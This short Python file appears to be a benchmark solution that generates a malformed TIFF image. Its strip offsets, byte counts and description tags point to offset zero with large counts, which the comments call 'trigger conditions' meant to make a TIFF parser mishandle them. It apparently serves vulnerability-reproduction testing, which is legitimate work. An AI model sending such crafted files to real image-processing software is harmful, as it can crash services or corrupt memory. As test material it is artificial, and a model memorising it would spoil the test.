import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
            return struct.pack("<HHII", tag & 0xFFFF, typ & 0xFFFF, count & 0xFFFFFFFF, value_or_offset & 0xFFFFFFFF)

        # Classic TIFF, little-endian, first IFD at offset 8
        header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)

        entries = []
        # Minimal baseline tags
        entries.append(ifd_entry(256, 4, 1, 1))      # ImageWidth = 1
        entries.append(ifd_entry(257, 4, 1, 100))    # ImageLength = 100
        entries.append(ifd_entry(258, 3, 1, 8))      # BitsPerSample = 8
        entries.append(ifd_entry(259, 3, 1, 1))      # Compression = 1 (none)
        entries.append(ifd_entry(262, 3, 1, 1))      # PhotometricInterpretation = 1 (BlackIsZero)

        # Trigger conditions: offline tag(s) with value offset of zero
        entries.append(ifd_entry(273, 4, 100, 0))    # StripOffsets[100] at offset 0 (invalid)
        entries.append(ifd_entry(277, 3, 1, 1))      # SamplesPerPixel = 1
        entries.append(ifd_entry(278, 4, 1, 1))      # RowsPerStrip = 1
        entries.append(ifd_entry(279, 4, 100, 0))    # StripByteCounts[100] at offset 0 (invalid)

        # Additional offline tag with offset 0 to improve hit rate
        entries.append(ifd_entry(270, 2, 1024, 0))   # ImageDescription[1024] at offset 0 (invalid)

        ifd = struct.pack("<H", len(entries)) + b"".join(entries) + struct.pack("<I", 0)
        return header + ifd